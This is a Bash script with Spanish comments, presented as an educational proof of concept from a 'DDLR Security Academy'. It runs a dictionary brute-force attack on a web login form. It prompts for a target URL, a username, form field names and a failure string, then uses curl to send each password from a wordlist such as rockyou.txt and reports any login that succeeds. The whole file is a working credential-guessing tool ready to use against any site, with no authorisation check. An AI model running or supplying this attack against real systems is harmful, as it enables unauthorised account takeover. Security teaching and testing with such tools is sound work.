#!/bin/bash

# ===============================================
# DDLR Security Academy - Login BruteForce PoC
# Script para realizar un ataque de fuerza bruta a un formulario de login.
# Uso: bash bruteforce_login.sh /ruta/al/diccionario/rockyou.txt
# ===============================================

# Verificar si se proporcionó la wordlist
if [ -z "$1" ]; then
    echo "ERROR: Debe proporcionar la ruta a la wordlist (diccionario)."
    echo "Uso: bash bruteforce_login.sh /ruta/al/diccionario/rockyou.txt"
    exit 1
fi

wordlist="$1"
URL=""
usuario=""
failure=""
tipo=""
uservar=""
passvar=""
try=0

# Banner ASCII (Mejorado para limpieza)
echo "
      ██████╗ ██████╗ ██╗     ██████╗
      ██╔══██╗██╔══██╗██║     ██╔══██╗
      ██║  ██║██║  ██║██║     ██████╔╝
      ██║  ██║██║  ██║██║     ██╔══██╗
      ██████╔╝██████╔╝███████╗██║  ██║
      ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
       ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▓  ░░ ▒▓ ░▒▓
       ░ ▒  ▒  ░ ▒  ▒ ░ ░ ▒  ░  ░▒ ░ ▒
       ░ ░  ░  ░ ░  ░   ░ ░     ░░   ░ 
         ░       ░        ░  ░   ░     
       ░       ░                       

DDLR Security Academy - Login BruteForce PoC
          https://edu.ddlr.org

"

# Recolección de parámetros de entrada
read -r -p "Enter URL: " URL
read -r -p "Enter username: " usuario
read -r -p "Enter Failure String (para detectar fallo): " failure
read -r -p "Form method (POST/GET): " tipo
read -r -p "Username variable name (ej: usuario): " uservar
read -r -p "Password variable name (ej: password): " passvar

# Mensaje de configuración
echo -e "\nAtaque configurado:"
echo "Método: $tipo"
echo "URL Objetivo: $URL"
echo "Usuario a probar: $usuario"
echo "Variable de usuario: $uservar"
echo "Variable de contraseña: $passvar"
echo "Diccionario: $wordlist"
echo "Cadena de fallo: '$failure'"

sleep 2
echo "Iniciando ataque..."

# Bucle principal de fuerza bruta
# Leer el archivo de diccionario línea por línea
while IFS= read -r password <&3; do
    
    # Construcción de la petición cURL
    # Se usa -d para POST. Para GET, el comando cURL debe construirse de otra manera (ej: usando -G).
    # La sintaxis de interpolación de variables se corrige para ser funcional en Bash.
    response=$(curl -s -X "$tipo" -d "$uservar=$usuario&$passvar=$password" "$URL")
    
    # Contador de intentos
    (( try++ ))

    # Detección de éxito/fallo
    # Si la cadena de fallo (failure string) NO se encuentra en la respuesta
    if ! echo "$response" | grep -q "$failure"; then
        echo -e "\n!!! Login exitoso encontrado !!!"
        echo "#$try Login exitoso con usuario: $usuario y contraseña: $password"
        echo "----------------------------------------------"
        exit 0 # Salir al encontrar el éxito
    else
        # Si se encuentra la cadena de fallo
        echo "#$try Login fallido con usuario: $usuario y contraseña: $password"
    fi 
    
done 3< "$wordlist"

echo -e "\nFin del ataque. No se encontró ninguna contraseña válida en el diccionario."
